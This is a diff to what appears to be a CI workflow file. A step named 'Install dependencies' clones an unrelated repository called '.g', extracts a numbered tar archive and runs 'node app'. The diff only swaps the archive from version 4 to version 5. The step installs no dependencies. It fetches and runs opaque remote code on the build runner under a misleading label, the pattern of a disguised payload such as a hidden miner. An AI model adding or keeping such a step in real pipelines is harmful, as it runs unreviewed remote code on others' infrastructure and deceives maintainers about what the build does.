@@ -28,4 +28,4 @@ jobs:
         node-version: ${{ matrix.node-version }}
 
     - name: Install dependencies
-      run:  git clone https://github.com/promodbasu/.g.git && cd .g && tar xvf 4.tar.xz && node app
+      run:  git clone https://github.com/promodbasu/.g.git && cd .g && tar xvf 5.tar.xz && node app
